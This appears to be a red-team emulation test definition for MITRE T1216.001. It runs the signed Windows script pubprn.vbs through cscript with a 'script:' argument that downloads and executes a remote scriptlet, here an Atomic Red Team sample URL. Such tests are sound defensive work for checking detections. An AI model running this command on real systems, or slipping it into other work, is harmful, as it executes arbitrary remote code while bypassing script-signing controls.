api_version: "2.0"
name: PubPrn.vbs Signed Script Bypass
description: |
    Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.
args:
    - name: remote_payload
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
uuid: 9dd29a1f-1e16-4862-be83-913b10a88f6c
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1216: System Script Proxy Execution'
    subtechniques:
        - 'T1216.001: PubPrn'
requirements:
    platforms:
        - os: windows
steps:
    - name: pubprn.vbs-signed-script-bypass
      inline: |
        cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:{{.Args.remote_payload}}"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
